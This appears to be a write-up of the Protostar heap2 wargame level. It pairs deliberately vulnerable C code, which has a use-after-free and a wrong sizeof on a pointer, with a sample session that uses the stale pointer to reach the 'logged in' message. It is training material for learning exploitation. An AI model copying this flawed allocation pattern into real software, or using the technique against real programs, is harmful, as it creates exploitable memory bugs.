Source:
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if(fgets(line, sizeof(line), stdin) == NULL) break;
    
    if(strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(auth));
      memset(auth, 0, sizeof(auth));
      if(strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if(strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if(strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if(strncmp(line, "login", 5) == 0) {
      if(auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```

This level is completed when you see the “you have logged in already!” message

Useful hint: take advantage of stale pointer.

Sample output:
```bash
user@protostar:/opt/protostar/bin$ ./heap2
[ auth = (nil), service = (nil) ]
service
[ auth = (nil), service = 0x804c008 ]
auth aaaa
[ auth = 0x804c018, service = 0x804c008 ]
reset
[ auth = 0x804c018, service = 0x804c008 ]
service aaaabbbbccccddddeeeeffffgggghhhhiiii
[ auth = 0x804c018, service = 0x804c028 ]
login
you have logged in already!
[ auth = 0x804c018, service = 0x804c028 ]
```
